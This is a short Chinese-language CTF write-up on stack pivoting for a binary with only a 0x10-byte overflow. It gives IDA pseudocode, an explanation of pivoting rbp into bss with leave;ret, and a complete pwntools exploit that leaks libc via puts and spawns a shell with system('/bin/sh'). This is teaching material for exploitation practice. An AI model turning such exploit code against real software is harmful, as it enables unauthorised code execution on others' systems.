### 最严苛条件下的栈迁移

#### IDA分析

```
int sub_4011DB()
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF

  puts("I've seen you before!");
  puts("just chat with me:");
  read(0, buf, 0x60uLL);
  return puts("so funny");
}
```

只能溢出0x10字节，也就是只能改变rbp和rip一次

将rbp迁移到bss段上的tar_addr处，通过控制rip跳转到read函数处，可以再次进行控制tar_addr-0x50~rar_addr+0x10字节的内容，在这段内容中输入rop链

在这次read中将rbp劫持到tar_addr-0x50，rip劫持到leave_ret的地址，执行leave_ret时rsp就被劫持到tar_addr-0x50

执行ret时就会触发我们布置在tar_addr-0x50~rar_addr的rop链

反复利用以上手法getshell

#### exp

```
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

io = process('/home/kali/Desktop/pwn_2')
# io = gdb.debug('/home/kali/Desktop/pwn_2')

elf = ELF('/home/kali/Desktop/pwn_2')
libc = ELF('/home/kali/pwn/libc/x64/libc-2.23.so')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search(b'/bin/sh'))

stdout_addr = 0x404020
bss_addr = 0x404000+0x500
read_addr = 0x4011FF
pop_rdi_ret = 0x4012B3
leave_ret_addr = 0x401227
ret_addr = 0x4012B4

payload1 = b'a'*0x50 + p64(bss_addr) + p64(read_addr)
io.sendafter(b'just chat with me:\n',payload1)

payload2 = p64(bss_addr-0x200) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(read_addr) + b'a' *0x28 + p64(bss_addr-0x50) + p64(leave_ret_addr)
io.sendafter(b'so funny\n',payload2)

io.recvuntil(b'\x0a')

libc_base = u64(io.recvuntil(b'\x7f').ljust(8,b'\x00')) - puts_offset
system_addr = system_offset + libc_base
bin_sh_addr = bin_sh_offset + libc_base

print(hex(system_addr))
print(hex(bin_sh_addr))

payload3 = p64(bss_addr-0x400) + p64(ret_addr) +p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(read_addr) + b'a' *0x20 + p64(bss_addr-0x200-0x50) + p64(leave_ret_addr)
# sleep(1)
io.send(payload3)


io.interactive()
```
